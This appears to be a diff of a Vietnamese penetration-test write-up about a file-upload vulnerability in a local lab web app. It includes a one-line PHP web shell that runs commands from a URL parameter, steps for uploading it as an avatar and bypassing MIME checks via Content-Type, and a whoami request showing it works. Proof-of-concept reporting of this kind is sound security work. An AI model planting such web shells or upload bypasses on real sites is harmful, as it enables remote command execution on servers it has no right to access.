@@ -260,11 +260,8 @@ Tạo file **`pls.php`** với nội dung:
 <?php echo system($_GET['command']); ?>
 ```
 ### 📌 3. Upload file pls.php thông qua chức năng Upload Avatar
-### 📌 4. Tìm request trong HTTP History và chỉnh sửa
-- Mặc định, hệ thống có thể từ chối .php, nhưng kẻ tấn công có thể đổi header Content-Type để bypass kiểm tra MIME.
-- Nếu file được upload thành công, kiểm tra đường dẫn truy cập:
-http://localhost/web_pen_v1/public/uploads/pls.php
-### 📌 5. Thực thi lệnh từ xa
+
+### 📌 4. Thực thi lệnh từ xa
 Gửi request thực thi lệnh whoami để xác định user chạy webserver:
 ```
 GET /web_pen_v1/public/uploads/pls.php?command=whoami HTTP/1.1
@@ -272,12 +269,14 @@ Host: localhost
 ````
 -Response trả về:
 ```
-nginx
-apache
+HTTP/1.1 200 OK
+Server: Apache/2.4.62 (Win64) OpenSSL/3.0.15 PHP/8.3.16
+...
+desktop-4kbnl3q\ducson
 ```
 -👉 Điều này chứng minh lệnh đã được thực thi trên máy chủ.
 
-### 🚨 6. Ảnh Chụp Màn Hình (PoC Visuals)
+### 🚨 5. Ảnh Chụp Màn Hình (PoC Visuals)
 Step	Description	Images
 1	Upload thành công file webshell pls.php.	📷
 2	Intercept request upload và chỉnh sửa Content-Type để bypass kiểm tra MIME.	📷
